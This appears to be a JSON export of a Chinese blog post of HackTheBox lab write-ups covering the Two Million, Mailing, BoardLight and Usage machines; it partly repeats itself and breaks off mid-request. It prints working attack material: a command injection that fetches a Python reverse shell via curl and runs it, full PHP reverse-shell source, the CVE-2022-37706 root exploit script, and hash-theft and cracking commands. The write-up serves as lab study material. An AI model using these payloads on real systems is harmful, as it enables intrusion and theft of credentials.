noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \"/dev/../tmp/;/tmp/exploit\" /tmp///net\n\nread -p \"Press any key to clean the evedence...\"\necho -e \"Please wait... \"\n\nsleep 5\nrm -rf /tmp/exploit\nrm -rf /tmp/net\necho -e \"Done; Everything is clear ;)\"\n```\n\n中间的 `${file}` 那行不知道为啥断行了，给它三句连起来，记得加空格。\n在靶机执行拿到 root 的 shell，读 `root.txt` 拿到第二个 flag。\n\n## Usage\n\n扫端口只有 80 和 22，老样子，先加 host\n\n```bash\nsudo echo \"10.10.11.18    http://usage.htb\" >> /etc/hosts\n```\n\n然后访问，是一个登录页面，用 whatweb 看眼，发现是 Laravel\n\n```bash\n$ whatweb http://usage.htb/\nhttp://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]\n```\n\n在 [Hacktricks](https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/laravel) 上有说存在 SQL 注入漏洞，测一下\n先注册一个 `a@a.com` 的用户，再在重置密码的 `email` 项输入 `a@a.com'`，发现引号能触发 500 错误，说明存在注入。\n\n```sql\na@a.com' AND 1=1;-- -\n```\n\n上面的语句的 response 是成功执行。于是把请求体复制到 request.txt，用 sqlmap 跑\n\n```yaml\nPOST http://usage.htb/forget-password HTTP/1.1\nHost: usage.htb\nContent-Length: 84\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://usage.htb\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://usage.htb/forget-password\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: XSRF-TOKEN=eyJpdiI6IkhFakpQK2l4cU5sYkhHZzZoN00rUmc9PSIsInZhbHVlIjoiYysvaTY0WDl1dXBXMGR2TzM5YWt2aEg4T051akNzTDFxcWJzUC9yY3pPajN4ei9FRTRJbzNuQ2htY0pmc25xWGR5anV6UzFHTkJ1N2tYYWlJcUEzNjZnSmNVMzdaa0hWNWlST3BVeTlqUnpBdVJ0aEVlOTVUSnBlNXdTa29UTk8iLCJtYWMiOiI0NzIxOTRkMTk4ZWEyN2E2YjI1YTA1NzI4ODg3MzFjZWM0YjJkZGRhNTZjOWYxZGVkNmRjMWRkNTYyNzYzMjUwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IktHWU1MYzFSNDBvSEN1M2dRSVJlTmc9PSIsInZhbHVlIjoib1FJU1RXWWxPV0ZRem5NNGJxUzR1QkdCdFpYMm8yWGxNblhFL0hIaFdnOWxSK3c0bStqNk9wY1Jsd3ZPZHFTTkdCWjByMnJNTkNnV21hZVJrZGZZcTdBbTFpT3YzOVBubENxT09FWTdBQlhPdEZoTGExMnZHdUZXZ0svOEF5cHkiLCJtYWMiOiI1NWNhNDg3OWZmOTEzNjkzNDMxZGNkZDVjODljMzBkMTRkYzcwZjU2MjI4ZDk5NTBkNzAxOTdhMzlkNTk3MzAxIiwidGFnIjoiIn0%3D\nConnection: close\n\n_token=KwTPctNAzmgzsn7wIgf7PC16p7nJ52U7AGT0MNHQ&email=a%40a.com # 注意这里用手注的 payload\n```\n\n<这里想起来就补>\n\n用 john 爆出密码 `whatever1`，在 `admin.usage.htb` 登录。\n发现没什么能做的，只有头像能改，测试只有前端有文件后缀校验，于是传一个 PHP 反弹 shell 的 png 上去，再用 burp 改成 .php 再传一次，刷新页面，拿到 shell。\n传 linpeas.sh 开扫，发现 `/home/dash/.ssh/id_rsa`，下到本地，登录\n\n```bash\nchmod 600 dash.pri  # 不然不给连\nssh -i dash.pri dash@10.10.11.18\n```\n\n`/home/dash` 目录下有个 `.monitrc`，内容如下：\n\n```bash\n#Monitoring Interval in Seconds\nset daemon  60\n\n#Enable Web Access\nset httpd port 2812\n     use address 127.0.0.1\n     allow admin:3nc0d3d_pa$$w0rd\n\n#Apache\ncheck process apache with pidfile \"/var/run/apache2/apache2.pid\"\n    if cpu > 80% for 2 cycles then alert\n\n\n#System Monitoring\ncheck system usage\n    if memory usage > 80% for 2 cycles then alert\n    if cpu usage (user) > 70% for 2 cycles then alert\n        if cpu usage (system) > 30% then alert\n    if cpu usage (wait) > 20% then alert\n    if loadavg (1min) > 6 for 2 cycles then alert\n    if loadavg (5min) > 4 for 2 cycles then alert\n    if swap usage > 5% then alert\n\ncheck filesystem rootfs with path /\n       if space usage > 80% then alert\n```\n\n这里就藏着 xander 的密码 `3nc0d3d_pa$$w0rd`（感觉有点脑洞）\n登录后 `sudo -l` 看一眼，发现可以 `sudo /usr/bin/usage_management`，把文件拖下看用 IDA 看一眼\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [rsp+Ch] [rbp-4h] BYREF\n\n  puts(\"Choose an option:\");\n  puts(\"1. Project Backup\");\n  puts(\"2. Backup MySQL data\");\n  puts(\"3. Reset admin password\");\n  printf(\"Enter your choice (1/2/3): \");\n  __isoc99_scanf(\"%d\", &v4);\n  if ( v4 == 3 )\n  {\n    resetAdminPassword();\n  }\n  else\n  {\n    if ( v4 > 3 )\n    {\nLABEL_9:\n      puts(\"Invalid choice.\");\n      return 0;\n    }\n    if ( v4 == 1 )\n    {\n      backupWebContent();\n    }\n    else\n    {\n      if ( v4 != 2 )\n        goto LABEL_9;\n      backupMysqlData();\n    }\n  }\n  return 0;\n}\n```\n\n发现 `resetAdminPassword` 是用来消遣你的\n\n```c\nint resetAdminPassword()\n{\n  return puts(\"Password has been reset.\");\n}\nvoid backupWebContent()\n{\n  if ( chdir(\"/var/www/html\") )\n    perror(\"Error changing working directory to /var/www/html\");\n  else\n    system(\"/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *\");\n}\nint backupMysqlData()\n{\n  return system(\"/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql\");\n}\n```\n\n来分析一下这句命令\n\n```bash\n/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *\n```\n\n`7za` 是 7zip 的命令行版本，`a` 是添加文件到压缩包，位置为 `/var/backups/project.zip`，`-tzip` 指定压缩格式为 zip，`-snl` 将符号链接作为链接存储，即不是压缩其指向的内容，`-mmt` 是多线程压缩，`--` 结束选项，`*` 压缩所有文件。\n[Hacktricks](https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/wildcards-spare-tricks) 提到了利用这个的 trick，在 7z 中，`@` 开头的文件名会被当作文件列表，所以如下命令执行的时候 7z 会把 `root.txt` 当作文件列表，然后尝试对 `root.txt` 里列出的文件进行压缩\n\n```bash\ncd /var/www/html\ntouch @root.txt\nln -s /root/root.txt root.txt\n```\n\n然后再执行备份命令，就能在报错信息看到 root.txt 的内容了。\n\n> 软链接与硬链接\n  这里说一下软链接与硬链接的区别，软链接类似 Windows 中的快捷方式，可以跨越文件系统，硬链接则不行。所有硬链接，包括原文件指向的都是同一个 inode（索引节点），众生平等，除非只剩最后一个，否则删除一个硬链接不会影响其他硬链接，而软链接则不同，删除原文件会导致软链接失效。\n  生成方法上，软链接 `ln -s`；硬链接 `ln`，目录则需要 `cp -al /path/to/dir /path/to/link`。\n  一般来说，软链接用得多，硬链接用得少。\n\n## 参考\n\nTwo Million\n<https://h4r1337.github.io/posts/two-million/>\n<https://blog.csdn.net/song_lee/article/details/131245481>\nMailing\n<https://blog.csdn.net/m0_52742680/article/details/138482768>\n<https://blog.csdn.net/whale_waves/article/details/138896310>\nBoardLight\n<https://blog.csdn.net/m0_52742680/article/details/139233464>\n<https://blog.csdn.net/2201_75526400/article/details/139304432>\nUsage\n<https://blog.csdn.net/zr1213159840/article/details/124548770>\n<https://amandaguglieri.github.io/hackinglife/htb-usage/>\n","source":"_posts/HackTheBox 笔记 - 1.md","raw":"---\ntitle: HackTheBox 笔记 - 1\ndate: 2024-05-17 20:12:00\ntags: [Web, 渗透]\ncategories: 渗透\n---\n\n不得不找饭吃了。\nTwo Million / Mailing / BoardLight / Usage\n\n<!--more-->\n\n## 配置\n\n国内访问比较慢，生成 VPN 的时候选 TCP，然后在下载的 `.ovpn` 文件里加一行 `http-proxy ip:port`，再用 `openvpn` 连接就行了，快很多。\n\n## 新手村\n\n四道基础题，基本就是 nmap 扫。\n主要记住一些参数，比如 `-p-` 扫描所有端口，`--min-rate <num>` 设置扫描速率，`-n` 不解析域名，`-sS` SYN 扫描，`-Pn` 不 ping 主机，`--open` 只显示开放端口，`--stats-every <num>` 每扫描多少个端口显示一次统计信息，`-vv` 详细输出。\n\n## Two Million\n\n扫出来两个端口，一个是 80，一个是 22。\n\n访问 80 端口，301 到 2million.htb，改 `etc/host` 加一行 `10.10.11.221    2million.htb`，再访问，发现是个登录页面。\n根据提示找到 `inviteapi.min.js`，内容如下：\n\n```javascript\neval(\n  function (p, a, c, k, e, d) {\n    e = function (c) {\n      return c.toString(36)\n    };\n    if (!''.replace(/^/, String)) {\n      while (c--) {\n        d[c.toString(a)] = k[c] ||\n        c.toString(a)\n      }\n      k = [\n        function (e) {\n          return d[e]\n        }\n      ];\n      e = function () {\n        return '\\\\w+'\n      };\n      c = 1\n    };\n    while (c--) {\n      if (k[c]) {\n        p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c])\n      }\n    }\n    return p\n  }(\n    '1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {\n    }\n  )\n)\n```\n\n打开 [de4js](https://lelinhtinh.github.io/de4js/) 去混淆得到：\n\n```javascript\nfunction verifyInviteCode(code) {\n    var formData = {\n        \"code\": code\n    };\n    $.ajax({\n        type: \"POST\",\n        dataType: \"json\",\n        data: formData,\n        url: '/api/v1/invite/verify',\n        success: function (response) {\n            console.log(response)\n        },\n        error: function (response) {\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode() {\n    $.ajax({\n        type: \"POST\",\n        dataType: \"json\",\n        url: '/api/v1/invite/how/to/generate',\n        success: function (response) {\n            console.log(response)\n        },\n        error: function (response) {\n            console.log(response)\n        }\n    })\n}\n```\n\n执行\n\n```bash\ncurl http://2million.htb/api/v1/invite/how/to/generate -X POST\n```\n\n得到\n\n```json\n{\"0\":200,\"success\":1,\"data\":{\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\",\"enctype\":\"ROT13\"},\"hint\":\"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"}\n```\n\n直接 CyberChef 解 ROT13 得到 In order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate。\n好吧，改个 PATH，再 POST 一下，得到\n\n```json\n{\"0\":200,\"success\":1,\"data\":{\"code\":\"QUtZOEYtMENKMzMtSEE5OVEtS1VHTzQ=\",\"format\":\"encoded\"}}\n```\n\n解码得到 `PBBOO-D9FOB-9BVZP-KCGHW`，不知道为什么 POST 到 `/api/v1/invite/verify` 的结果是 invalid。不管。\n\n注册登录后，顺着提示点击 Connection Pack，下载链接为 `/api/v1/user/vpn/generate`。\n访问 `/api/v1`，得到一堆 API。\n\n```plain\nv1\n  user\n    GET\n      /api/v1 \"Route List\"\n      /api/v1/invite/how/to/generate \"Instructions on invite code generation\"\n      /api/v1/invite/generate \"Generate invite code\"\n      /api/v1/invite/verify \"Verify invite code\"\n      /api/v1/user/auth \"Check if user is authenticated\"\n      /api/v1/user/vpn/generate \"Generate a new VPN configuration\"\n      /api/v1/user/vpn/regenerate \"Regenerate VPN configuration\"\n      /api/v1/user/vpn/download \"Download OVPN file\"\n    POST \n      /api/v1/user/register \"Register a new user\"\n      /api/v1/user/login \"Login with existing user\"\n  admin \n    GET \n      /api/v1/admin/auth \"Check if user is admin\"\n    POST \n      /api/v1/admin/vpn/generate \"Generate VPN for specific user\"\n    PUT \n      /api/v1/admin/settings/update \"Update user settings\"\n```\n\n发现 `/api/v1/admin/settings/update` 能改管理员身份，传一个\n\n```json\n{\n  \"email\": \"a@a.com\",\n  \"is_admin\":1\n}\n```\n\n就能把自己改成 admin。\n\n对 `/api/v1/admin/vpn/generate` 进行命令注入：\n\n```json\n{\n\"username\": \"abc;curl 10.10.14.20:5555/rshell.py | python3;ls\"\n}\n```\n\n把 shell 弹出来。\n`cat .env` 看到\n\n```conf\nDB_HOST=127.0.0.1\nDB_DATABASE=htb_prod\nDB_USERNAME=admin\nDB_PASSWORD=SuperDuperPass123\n```\n\n连一下数据库\n\n```bash\nmysql --user admin --password htb_prod\n```\n\n发现里面没啥有用的，用数据库的密码试一下 ssh，发现密码是相同的。于是登上 admin，然后读 `user.txt` 拿到第一个 flag。\n\n然后根据提示找到 `/var/mail/admin`，里面说 OverlayFS 有 CVE，定位到 CVE-2023-0386。\n\n用[这个 PoC](https://github.com/xkaneiki/CVE-2023-0386) 打一下就行了。\n后面题目问 GLIBC 版本，执行 `ldd --version` 即可。\n\n还留下了一个 CVE-2023-4911，有空再看。\n\n### CVE-2023-0386\n\n下面来详细分析一下这个 CVE。\n\n#### FUSE\n\nFUSE(Filesystem in Userspace)\n\n## Mailing\n\nVMWare 的 Kali GUI 崩了，登录完直接黑屏，我之前也忘了存个快照，于是现在就采用纯命令行 + 代理转发的形式用，反正 GUI 里也只图个 Browser 和 Burpsuite。\n\n还是用的 squid，squid.conf 按下面配置，再重启一下服务就行。\n\n```plain\nacl all src all\nhttp_access allow all\nhosts_file /etc/hosts\nhttp_port 3128\n```\n\nBurpsuite 里 settings -> Network -> Connection -> Upstream Proxy Servers，设置好代理，然后就能用了。\nnmap 一扫发现一堆端口，基本都是邮件服务相关，结果如下：\n\n```plain\nPORT      STATE SERVICE\n25/tcp    open  smtp\n80/tcp    open  http\n110/tcp   open  pop3\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n143/tcp   open  imap\n445/tcp   open  microsoft-ds\n465/tcp   open  smtps\n587/tcp   open  submission\n993/tcp   open  imaps\n5040/tcp  open  unknown\n5985/tcp  open  wsman\n7680/tcp  open  pando-pub\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n50304/tcp open  unknown\n```\n\ndirsearch 扫出 `/assets/` 和 `/download.php`。\n`/assets/` 存着一些图片，`/download.php` 可以任意文件读。\n由前面扫到的端口可知这是一个 hMailServer，所以可以直接读 `hMailServer.INI`。\n`?file=../../../../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.INI` 读出如下内容：\n\n```ini\n[Directories]\nProgramFolder=C:\\Program Files (x86)\\hMailServer\nDatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database\nDataFolder=C:\\Program Files (x86)\\hMailServer\\Data\nLogFolder=C:\\Program Files (x86)\\hMailServer\\Logs\nTempFolder=C:\\Program Files (x86)\\hMailServer\\Temp\nEventFolder=C:\\Program Files (x86)\\hMailServer\\Events\n[GUILanguages]\nValidLanguages=english,swedish\n[Security]\nAdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7\n[Database]\nType=MSSQLCE\nUsername=\nPassword=0a9f8ad8bf896b501dde74f08efd7e4c\nPasswordEncryption=1\nPort=0\nServer=\nDatabase=hMailServer\nInternal=1\n```\n\nadmin 的密码 hash 为 841bb5acfa6779ae432fd7a4e6600ba7，用 hash-identifier 判断是 MD5，用在线网站解密得到 `homenetworkingadministrator`。\n\nmd5 在线解密的网站有 [Hashes](https://hashes.com/zh/decrypt/hash)，[crackstation](https://crackstation.net/) 等。\n\n用 CVE-2024-21413 打，参考[这篇文章](https://www.freebuf.com/vuls/396256.html)，先启动 NTLM 监听\n\n```bash\nsudo impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp\n```\n\n再用 [PoC](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) 打\n\n```bash\npython3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\\\10.10.14.20\\test' --subject Hi\n```\n\n拿到 maya 的 NTLM hash\n\n```plain\nmaya::MAILING:aaaaaaaaaaaaaaaa:21bf11591531fc6d3736359f495482b4:0101000000000000804c7084b5b1da013e5cd1bc6af81a5f000000000100100057005a00720067005a00460043005a000300100057005a00720067005a00460043005a00020010004f007100510070005500580055006800040010004f00710051007000550058005500680007000800804c7084b5b1da0106000400020000000800300030000000000000000000000000200000146f2fe8ad5fb58c04447d1f84d31aa0faae084bb712011964e5eb9820bf33200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320030000000000000000000\n```\n\n放到 `1.txt`，用 hashcat 爆\n\n```bash\nhashcat -a 0 -o passwd.txt 1.txt /usr/share/wordlists/rockyou.txt\n```\n\n`-a 0` 意思是字典模式，`-o passwd.txt` 是输出文件，`1.txt` 是输入文件，`/usr/share/wordlists/rockyou.txt` 是字典文件。\n爆出来密码是 `m4y4ngs4ri`。\n然后用红队神器 evil-winrm 连上，拿到 Windows 的 shell，读 `user.txt` 拿到第一个 flag。\n\n```bash\nevil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri\n```\n\n很奇怪这里用 hash 登录不行，会报错 `Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError`。\n\n现在就要开始提权了。\n\nProgram Files 里有个 `LibreOffice`，查看 `readme_en-US.txt` 可以知道版本是 7.4。\n搜出是有 CVE-2023-2255 的，用 [PoC](https://github.com/elweth-sec/CVE-2023-2255) 打\n把反弹 shell 的  `shell.py` 传到 `C:\\Users\\maya\\Documents\\`，然后本地生成 `exploit.odt`，再在 Windows 上 curl 下来。\n\n```bash\npython3 CVE-2023-2255.py --cmd \"python C:\\Users\\maya\\Documents\\shell.py\" --output 'exploit.odt'\n```\n\n在本地挂着 `nc -lvnp <port>`，一会就有 shell 过来了。\n\n弹到 localadmin 的 shell 后，可以直接读桌面的 `root.txt` 拿到 flag，也可以通过以下命令把 maya 提到管理员组：\n\n```bash\nnet localgroup Administradores maya /add\n```\n\n总的来说，这 Windows 的渗透是真迷糊，一点不会。而且不知道为啥 Evil-WinRM 连上后命令卡得要死\n\n## BoardLight\n\n扫出来两个端口，一个是 80，一个是 22。\n一个静态网页，无交互，源码里面有一个 Board.htb，加到 host 里面访问，还是这个页面。\n开始扫子域名\n\n```bash\nwfuzz -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://board.htb\" -H \"Host:FUZZ.board.htb\" --hw 1053\n```\n\n`--hw 1053` 是过滤掉 1053 字节的响应。\n扫到一个 `crm.board.htb`。\n加入 `/etc/hosts` 里，访问到是一个 Dolibarr 的登录页面，随手敲个 admin admin 竟然登上去了，乐。\n新建一个 website，再在里面新建一个 Page，编辑 HTML 源，写 PHP，保存会报 `You add dynamic PHP code that contains the PHP instruction 'system' that is forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx to increase list of allowed commands).\n`\n\n大写 PHP 绕过，有时也可以直接短标签 `<?`，或者 `<?=system('ls')?>`，这句等效于 `<?php echo system('ls')?>`。\n在 [Reverse Shell Generator](https://www.revshells.com/) 生成一个 PHP 反弹 shell，然后写进去\n记得勾上 `Show dynamic content`\n\n```php\n<?PHP\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '10.10.14.20';\n$port = 55555;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; bash -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n  $pid = pcntl_fork();\n  \n  if ($pid == -1) {\n    printit(\"ERROR: Can't fork\");\n    exit(1);\n  }\n  \n  if ($pid) {\n    exit(0);  // Parent exits\n  }\n  if (posix_setsid() == -1) {\n    printit(\"Error: Can't setsid()\");\n    exit(1);\n  }\n\n  $daemon = 1;\n} else {\n  printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n  printit(\"$errstr ($errno)\");\n  exit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n  printit(\"ERROR: Can't spawn shell\");\n  exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n  if (feof($sock)) {\n    printit(\"ERROR: Shell connection terminated\");\n    break;\n  }\n\n  if (feof($pipes[1])) {\n    printit(\"ERROR: Shell process terminated\");\n    break;\n  }\n\n  $read_a = array($sock, $pipes[1], $pipes[2]);\n  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n  if (in_array($sock, $read_a)) {\n    if ($debug) printit(\"SOCK READ\");\n    $input = fread($sock, $chunk_size);\n    if ($debug) printit(\"SOCK: $input\");\n    fwrite($pipes[0], $input);\n  }\n\n  if (in_array($pipes[1], $read_a)) {\n    if ($debug) printit(\"STDOUT READ\");\n    $input = fread($pipes[1], $chunk_size);\n    if ($debug) printit(\"STDOUT: $input\");\n    fwrite($sock, $input);\n  }\n\n  if (in_array($pipes[2], $read_a)) {\n    if ($debug) printit(\"STDERR READ\");\n    $input = fread($pipes[2], $chunk_size);\n    if ($debug) printit(\"STDERR: $input\");\n    fwrite($sock, $input);\n  }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n  if (!$daemon) {\n    print \"$string\\n\";\n  }\n}\n\n?>\n```\n\n拿到 www-data 的 shell\n在 `/var/www/html/crm.board.htb/htdocs/conf/` 下找到 `conf.php`，里面有数据库的用户名和密码\n\n```php\n<?php\n//\n// File generated by Dolibarr installer 17.0.0 on May 13, 2024\n//\n// Take a look at conf.php.example file for an example of conf.php file\n// and explanations for all possibles parameters.\n//\n$dolibarr_main_url_root='http://crm.board.htb';\n$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';\n$dolibarr_main_url_root_alt='/custom';\n$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';\n$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';\n$dolibarr_main_db_host='localhost';\n$dolibarr_main_db_port='3306';\n$dolibarr_main_db_name='dolibarr';\n$dolibarr_main_db_prefix='llx_';\n$dolibarr_main_db_user='dolibarrowner';\n$dolibarr_main_db_pass='serverfun2$2023!!';\n$dolibarr_main_db_type='mysqli';\n$dolibarr_main_db_character_set='utf8';\n$dolibarr_main_db_collation='utf8_unicode_ci';\n// Authentication settings\n$dolibarr_main_authentication='dolibarr';\n\n//$dolibarr_main_demo='autologin,autopass';\n// Security settings\n$dolibarr_main_prod='0';\n$dolibarr_main_force_https='0';\n$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';\n$dolibarr_nocsrfcheck='0';\n$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';\n$dolibarr_mailing_limit_sendbyweb='0';\n$dolibarr_mailing_limit_sendbycli='0';\n\n//$dolibarr_lib_FPDF_PATH='';\n//$dolibarr_lib_TCPDF_PATH='';\n//$dolibarr_lib_FPDI_PATH='';\n//$dolibarr_lib_TCPDI_PATH='';\n//$dolibarr_lib_GEOIP_PATH='';\n//$dolibarr_lib_NUSOAP_PATH='';\n//$dolibarr_lib_ODTPHP_PATH='';\n//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';\n//$dolibarr_js_CKEDITOR='';\n//$dolibarr_js_JQUERY='';\n//$dolibarr_js_JQUERY_UI='';\n\n//$dolibarr_font_DOL_DEFAULT_TTF='';\n//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';\n$dolibarr_main_distrib='standard';\n```\n\n登进数据库\n\n```bash\nmysql -u dolibarrowner -p\n```\n\n然后连上 dolibarr 数据库，查看表\n\n```sql\nuse dolibarr;\nshow tables;\n```\n\n发现没啥东西。\n`ls /home` 发现有个用户叫 larissa，用数据库的密码 ssh 进去，拿到第一个 flag。\n\n然后开始提权\n传个 `linpeas.sh` 过去开扫，发现 SUID 项里有 enlightenment，执行 `enlightenment -version` 可知版本为 0.23.1。\n\n`searchsploit enlightenment` 看到有个提权漏洞，再 `searchsploit -p linux/local/51180.txt` 看具体信息\n\n```yaml\n  Exploit: Enlightenment v0.25.3 - Privilege escalation\n      URL: https://www.exploit-db.com/exploits/51180\n     Path: /usr/share/exploitdb/exploits/linux/local/51180.txt\n    Codes: CVE-2022-37706\n Verified: False\nFile Type: ASCII text\n```\n\n`cat /usr/share/exploitdb/exploits/linux/local/51180.txt`，里面说这个洞能打 0.25.3 以下版本，也给出了 PoC 如下：\n\n```bash\n#!/usr/bin/bash\n# Idea by MaherAzzouz\n# Development by nu11secur1ty\n\necho \"CVE-2022-37706\"\necho \"[*] Trying to find the vulnerable SUID file...\"\necho \"[*] This may take few seconds...\"\n\n# The actual problem\nfile=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)\nif [[ -z ${file} ]]\nthen\n        echo \"[-] Couldn't find the vulnerable SUID file...\"\n        echo \"[*] Enlightenment should be installed on your system.\"\n        exit 1\nfi\n\necho \"[+] Vulnerable SUID binary found!\"\necho \"[+] Trying to pop a root shell!\"\nmkdir -p /tmp/net\nmkdir -p \"/dev/../tmp/;/tmp/exploit\"\n\necho \"/bin/sh\" > /tmp/exploit\nchmod a+x /tmp/exploit\necho \"[+] Welcome to the rabbit hole :)\"\n\n${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \"/dev/../tmp/;/tmp/exploit\" /tmp///net\n\nread -p \"Press any key to clean the evedence...\"\necho -e \"Please wait... \"\n\nsleep 5\nrm -rf /tmp/exploit\nrm -rf /tmp/net\necho -e \"Done; Everything is clear ;)\"\n```\n\n中间的 `${file}` 那行不知道为啥断行了，给它三句连起来，记得加空格。\n在靶机执行拿到 root 的 shell，读 `root.txt` 拿到第二个 flag。\n\n## Usage\n\n扫端口只有 80 和 22，老样子，先加 host\n\n```bash\nsudo echo \"10.10.11.18    http://usage.htb\" >> /etc/hosts\n```\n\n然后访问，是一个登录页面，用 whatweb 看眼，发现是 Laravel\n\n```bash\n$ whatweb http://usage.htb/\nhttp://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]\n```\n\n在 [Hacktricks](https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/laravel) 上有说存在 SQL 注入漏洞，测一下\n先注册一个 `a@a.com` 的用户，再在重置密码的 `email` 项输入 `a@a.com'`，发现引号能触发 500 错误，说明存在注入。\n\n```sql\na@a.com' AND 1=1;-- -\n```\n\n上面的语句的 response 是成功执行。于是把请求体复制到 request.txt，用 sqlmap 跑\n\n```yaml\nPOST http://usage.htb/forget-password HTTP/1.1\nHost: usage.htb\nContent-Length: 84\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://usage.htb\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://usage.htb/forget-password\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: 